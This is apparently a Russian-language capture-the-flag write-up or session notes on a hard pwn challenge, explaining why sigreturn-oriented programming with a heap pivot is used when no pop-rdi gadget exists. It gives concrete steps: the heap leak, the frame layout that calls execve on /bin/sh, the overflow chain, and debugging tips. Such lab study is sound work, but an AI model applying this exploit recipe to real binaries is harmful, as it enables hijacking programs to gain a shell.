# PWN: SROP через heap-пивот, когда нет pop-гаджетов (sigreturn)

Задача: «Замок древнего мага» (платформа, pwn hard). Решено: флаг `[FLAG]`.
Условия: ELF64 no PIE, partial RELRO, NX ВКЛ, без canary, offset до ret = 24.

## Почему SROP
- Гаджеты: pop rbp;ret, leave;ret, ret, syscall, read@plt, puts@plt, printf@plt.
- НЕТ pop rdi;ret и __libc_csu_init → ret2libc невозможно (нечем передать RDI).
- Есть syscall → SROP (rt_sigreturn) даёт контроль над всеми регистрами кадром.

## Эксплойт
1. Leak: `create_buffer` печатает `buf @ %p` (адрес кучи, берём из ответа).
2. Наполнение кучи: buf[0x10]=buf+0x20 (rbp), buf[0x18]=0x401222 (ret→read(0,buf,0x7d0)),
   buf[0x20]=buf+0x30, buf[0x28]=0x401244 (syscall),
   buf[0x30:+0xf8]=SigreturnFrame(RAX=59,RDI=buf+0x300,RIP=0x401244),
   buf[0x300]="/bin/sh\x00".
3. Переполнение (48): A*8+B*8+ret+pop_rbp+buf+0x10+leave → rsp=buf+0x10.
4. Второй read: ровно 15 байт (\x90*15) → rax=15 → syscall → execve.
5. Команды шеллу — отдельной отправкой.

## Критичные ловушки
- Синхронизация read: если второй read получает 0 байт (EOF), SROP не работает.
  Поток: payload → сразу 15 байт → пауза ~0.5с → команды.
- buf-адрес меняется между запусками: бери из ответа ТОГО ЖЕ запуска.
- Локальный тест: TESTFLAG{local_pwn_test}; remote: [FLAG].

## Диагностика, если не работает
1. gdb: b *0x401244; проверь кадр на стеке.
2. strace -e trace=read,write,rt_sigreturn: rax=15 и что второй read вернул 15.
3. Перебор: сдвиги кадра 0x18/0x20/0x28/0x30/0x38, префиксы 0/8/.../56,
   выравнивание RSP по 16.
4. read#2 даёт EOF → меняй способ доставки (паузы, отдельные отправки).

## Правило
- Нет pop rdi + нет CSU → сразу проверяй syscall-гаджет: если есть + контроль
  RSP → строй SROP, не трать время на ret2libc.
- SROP работает даже без leak libc.

## Артефакты
- Рабочие скрипты сессии: exploit_heap_srop.py (финальный), srop_shift_sweep.py,
  remote_strace.py, STATE_final.md.
